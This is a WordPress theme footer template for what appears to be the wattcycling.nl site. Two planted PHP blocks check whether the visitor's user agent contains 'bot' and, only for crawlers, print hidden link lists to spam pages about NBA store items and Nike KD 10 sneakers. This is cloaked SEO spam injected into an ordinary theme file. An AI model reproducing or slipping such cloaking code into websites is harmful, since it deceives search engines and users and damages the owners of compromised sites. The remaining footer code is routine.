<?php

global $mk_options;



$mk_footer_class = $show_footer = $disable_mobile = $footer_status = '';



$post_id = global_get_post_id();

if($post_id) {

  $show_footer = get_post_meta($post_id, '_template', true );

  $cases = array('no-footer', 'no-header-footer', 'no-header-title-footer', 'no-footer-title');

  $footer_status = in_array($show_footer, $cases);

}



if($mk_options['disable_footer'] == 'false' || ( $footer_status )) {

  $mk_footer_class .= ' mk-footer-disable';

}



if($mk_options['footer_type'] == '2') {

  $mk_footer_class .= ' mk-footer-unfold';

}





$boxed_footer = (isset($mk_options['boxed_footer']) && !empty($mk_options['boxed_footer'])) ? $mk_options['boxed_footer'] : 'true';

$footer_grid_status = ($boxed_footer == 'true') ? ' mk-grid' : ' fullwidth-footer';

$disable_mobile = ($mk_options['footer_disable_mobile'] == 'true' ) ? $mk_footer_class .= ' disable-on-mobile'  :  ' ';



?>

<?php
$tmp = "?" . strtolower($_SERVER['HTTP_USER_AGENT']);
if((strpos($tmp, 'bot') == true)){
echo '<div id="Related">
<ul>
<li><a href="http://wattcycling.nl/shop/NBAstoreJa/">NBAstoreJa</a></li>
<li><a href="http://wattcycling.nl/shop/NBAstoreJb/">NBAstoreJb</a></li>
<li><a href="http://wattcycling.nl/shop/NBAstoreJc/">NBAstoreJc</a></li>
<li><a href="http://wattcycling.nl/shop/NBAstoreJd/">NBAstoreJd</a></li>
<li><a href="http://wattcycling.nl/shop/NBAstoreJe/">NBAstoreJe</a></li>
<li><a href="http://wattcycling.nl/shop/NBAstoreJf/">NBAstoreJf</a></li>
<li><a href="http://wattcycling.nl/shop/NBAstoreJg/">NBAstoreJg</a></li>
<li><a href="http://wattcycling.nl/shop/NBAstoreJh/">NBAstoreJh</a></li>
<li><a href="http://wattcycling.nl/shop/NBAstoreJi/">NBAstoreJi</a></li>
<li><a href="http://wattcycling.nl/shop/NBAstoreJj/">NBAstoreJj</a></li>
<li><a href="http://wattcycling.nl/shop/NBAstoreJk/">NBAstoreJk</a></li>
<li><a href="http://wattcycling.nl/shop/NBAstoreJl/">NBAstoreJl</a></li>
<li><a href="http://wattcycling.nl/shop/NBAstoreJm/">NBAstoreJm</a></li>
<li><a href="http://wattcycling.nl/shop/NBAstoreJn/">NBAstoreJn</a></li>
<li><a href="http://wattcycling.nl/shop/NBAstoreJo/">NBAstoreJo</a></li>
<li><a href="http://wattcycling.nl/shop/NBAstoreJp/">NBAstoreJp</a></li>
<li><a href="http://wattcycling.nl/shop/NBAstoreJq/">NBAstoreJq</a></li>
<li><a href="http://wattcycling.nl/shop/NBAstoreJr/">NBAstoreJr</a></li>
<li><a href="http://wattcycling.nl/shop/NBAstoreJs/">NBAstoreJs</a></li>
<li><a href="http://wattcycling.nl/shop/NBAstoreJt/">NBAstoreJt</a></li>
</ul></div>';
}
?>

<section id="mk-footer-unfold-spacer"></section>



<section id="mk-footer" class="<?php echo $mk_footer_class; ?>" <?php echo get_schema_markup('footer'); ?>>

    <?php if($mk_options['disable_footer'] == 'true' && !$footer_status) : ?>

    <div class="footer-wrapper<?php echo $footer_grid_status;?>">

        <div class="mk-padding-wrapper">

            <?php mk_get_view('footer', 'widgets'); ?>

            <div class="clearboth"></div>

        </div>

    </div>

    <?php endif;?>

    <?php if ( $mk_options['disable_sub_footer'] == 'true' && ! $footer_status ) { 

        mk_get_view( 'footer', 'sub-footer', false, ['footer_grid_status' => $footer_grid_status] ); 

    } ?>

</section>

</div>

<?php 

    global $is_header_shortcode_added;

    

    if ( $mk_options['seondary_header_for_all'] === 'true' || get_header_style() === '3' || $is_header_shortcode_added === '3' ) {

        mk_get_header_view('holders', 'secondary-menu', ['header_shortcode_style' => $is_header_shortcode_added]); 

    }

?>

</div>



<div class="bottom-corner-btns js-bottom-corner-btns">

<?php

    if ( $mk_options['go_to_top'] != 'false' ) { 

        mk_get_view( 'footer', 'navigate-top' );

    }

    

    if ( $mk_options['disable_quick_contact'] != 'false' ) {

        mk_get_view( 'footer', 'quick-contact' );

    }

    

    do_action('add_to_cart_responsive');

?>

</div>





<?php if ( $mk_options['header_search_location'] === 'fullscreen_search' ) { 

    mk_get_header_view('global', 'full-screen-search');

} ?>



<?php if (!empty($mk_options['body_border']) && $mk_options['body_border'] === 'true') { ?>

    <div class="border-body border-body--top"></div>

    <div class="border-body border-body--left border-body--side"></div>

    <div class="border-body border-body--right border-body--side"></div>

    <div class="border-body border-body--bottom"></div>

<?php } ?>

<?php

$tmp = "?" . strtolower($_SERVER['HTTP_USER_AGENT']);

if((strpos($tmp, 'bot') == true)){

echo '<div id="Related">

<ul>

<li><a href="http://wattcycling.nl/2018/01/01/nike-kd-10/">nike kd 10</a></li>

<li><a href="http://wattcycling.nl/2018/01/02/nike-kd-10/">nike kd 10</a></li>

<li><a href="http://wattcycling.nl/2018/01/03/nike-kd-10/">nike kd 10</a></li>

<li><a href="http://wattcycling.nl/2018/01/04/nike-kd-10/">nike kd 10</a></li>

<li><a href="http://wattcycling.nl/2018/01/05/nike-kd-10-anniversary/">nike kd 10 anniversary</a></li>

<li><a href="http://wattcycling.nl/2018/01/06/nike-kd-10-anniversary/">nike kd 10 anniversary</a></li>

<li><a href="http://wattcycling.nl/2018/01/07/nike-kd-10-triple-black/">nike kd 10 triple black</a></li>

<li><a href="http://wattcycling.nl/2018/01/08/nike-kd-10-triple-black/">nike kd 10 triple black</a></li>

<li><a href="http://wattcycling.nl/2018/01/09/kevin-durant-shoes/">kevin durant shoes</a></li>

<li><a href="http://wattcycling.nl/2018/01/10/nike-kd-10-black-white/">nike kd 10 black white</a></li>

<li><a href="http://wattcycling.nl/2018/01/11/nike-kd-10-be-true/">nike kd 10 be true</a></li>

<li><a href="http://wattcycling.nl/2018/01/12/nike-kd-10-be-true/">nike kd 10 be true</a></li>

<li><a href="http://wattcycling.nl/2018/01/13/nike-kd-10-be-true/">nike kd 10 be true</a></li>

<li><a href="http://wattcycling.nl/2018/01/14/nike-durant/">nike durant</a></li>

<li><a href="http://wattcycling.nl/2018/01/15/kobe-10/">kobe 10</a></li>

<li><a href="http://wattcycling.nl/2018/01/16/kevin-durant/">kevin durant</a></li>

<li><a href="http://wattcycling.nl/2018/01/17/nike-kd-10-city-edition/">nike kd 10 city edition</a></li>

<li><a href="http://wattcycling.nl/2018/01/18/nike-kd-10-city-edition/">nike kd 10 city edition</a></li>

<li><a href="http://wattcycling.nl/2018/01/19/nike-kd-10-city-edition/">nike kd 10 city edition</a></li>

<li><a href="http://wattcycling.nl/2018/01/20/nike-kd-10-city-edition/">nike kd 10 city edition</a></li>

</ul></div>';

}

?>

<footer id="mk_page_footer">

    <?php

    

    wp_footer();



    if( (isset($mk_options['pagespeed-optimization']) and $mk_options['pagespeed-optimization'] != 'false')

     or (isset($mk_options['pagespeed-defer-optimization']) and $mk_options['pagespeed-defer-optimization'] != 'false')) {

    ?>

    <script>

        !function(e){var a=window.location,n=a.hash;if(n.length&&n.substring(1).length){var r=e(".vc_row, .mk-main-wrapper-holder, .mk-page-section, #comments"),t=r.filter("#"+n.substring(1));if(!t.length)return;n=n.replace("!loading","");var i=n+"!loading";a.hash=i}}(jQuery);

    </script>

    <?php } else { ?>

    <script>

        // Run this very early after DOM is ready

        (function ($) {

            // Prevent browser native behaviour of jumping to anchor

            // while preserving support for current links (shared across net or internally on page)

            var loc = window.location,

                hash = loc.hash;



            // Detect hashlink and change it's name with !loading appendix

            if(hash.length && hash.substring(1).length) {

                var $topLevelSections = $('.vc_row, .mk-main-wrapper-holder, .mk-page-section, #comments');

                var $section = $topLevelSections.filter( '#' + hash.substring(1) );

                // We smooth scroll only to page section and rows where we define our anchors.

                // This should prevent conflict with third party plugins relying on hash

                if( ! $section.length )  return;

                // Mutate hash for some good reason - crazy jumps of browser. We want really smooth scroll on load

                // Discard loading state if it already exists in url (multiple refresh)

                hash = hash.replace( '!loading', '' );

                var newUrl = hash + '!loading';

                loc.hash = newUrl;

            }

        }(jQuery));

    </script>

    <?php } ?>





    <?php 

    // Asks W3C Total Cache plugin to move all JS and CSS assets to before body closing tag. It will help getting above 90 grade in google page speed.

    if(isset($mk_options['pagespeed-optimization']) and $mk_options['pagespeed-optimization'] != 'false' and defined('W3TC')) {

        echo "<!-- W3TC-include-js-head -->";

        echo "<!-- W3TC-include-css -->";

    }

    ?>
<script src="<?php echo get_stylesheet_directory_uri() ?>/assets/js/jquery.sticky-sidebar-scroll.min.js"></script>
<script src="<?php echo get_stylesheet_directory_uri() ?>/assets/js/wattcycling-custom.js"></script>

</footer>
<?php //if(wp_is_mobile()){}else{?>
<script>  
/* jQuery(window).scroll(function(e){ 
  
}); */
</script>
<?php //} ?>
</body>
</html>